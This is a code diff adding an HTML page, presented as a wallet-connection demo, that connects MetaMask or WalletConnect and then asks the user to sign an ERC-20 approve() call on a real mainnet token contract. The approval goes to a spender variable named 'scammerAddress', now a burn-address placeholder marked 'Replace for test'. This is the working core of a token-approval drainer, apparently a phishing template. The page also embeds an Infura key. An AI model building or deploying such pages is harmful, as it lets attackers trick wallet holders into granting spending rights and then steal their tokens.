@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Wallet Connect + WalletConnect Demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+</head>
+<body>
+  <h2>Connect Wallet (MetaMask or WalletConnect)</h2>
+  <button id="connectBtn">Connect Wallet</button>
+  <button id="approveBtn" disabled>Approve Token Spend</button>
+
+  <script>
+    let provider;
+    let signer;
+    let userAddress;
+    let ethersProvider;
+
+    document.getElementById('connectBtn').onclick = async () => {
+      if (window.ethereum) {
+        // MetaMask or injected provider available
+        try {
+          await window.ethereum.request({ method: 'eth_requestAccounts' });
+          ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
+          signer = ethersProvider.getSigner();
+          userAddress = await signer.getAddress();
+          alert("Wallet connected (MetaMask): " + userAddress);
+          document.getElementById('approveBtn').disabled = false;
+        } catch (err) {
+          alert("MetaMask connection rejected.");
+        }
+      } else {
+        // No injected provider, use WalletConnect
+        try {
+          const WalletConnectProvider = window.WalletConnectProvider.default;
+          provider = new WalletConnectProvider({
+            infuraId: "https://mainnet.infura.io/v3/4aa83a1a6d3c4b318c210e38243466c9" // Required for WalletConnect
+          });
+          await provider.enable();
+          ethersProvider = new ethers.providers.Web3Provider(provider);
+          signer = ethersProvider.getSigner();
+          userAddress = await signer.getAddress();
+          alert("Wallet connected (WalletConnect): " + userAddress);
+          document.getElementById('approveBtn').disabled = false;
+        } catch (err) {
+          alert("WalletConnect connection failed.");
+        }
+      }
+    };
+
+    document.getElementById('approveBtn').onclick = async () => {
+      if (!signer) {
+        alert("Connect wallet first!");
+        return;
+      }
+
+      const erc20Abi = [
+        "function approve(address spender, uint256 amount) public returns (bool)"
+      ];
+
+      const scammerAddress = "0x000000000000000000000000000000000000dead"; // Replace for test
+      const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Replace with test token
+
+      const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
+
+      try {
+        const tx = await tokenContract.approve(
+          scammerAddress,
+          ethers.utils.parseUnits("1000", 18)
+        );
+        alert("Approval tx sent: " + tx.hash);
+        await tx.wait();
+        alert("Approval confirmed.");
+      } catch (err) {
+        alert("Approval failed or rejected.");
+      }
+    };
+  </script>
+</body>
+</html>
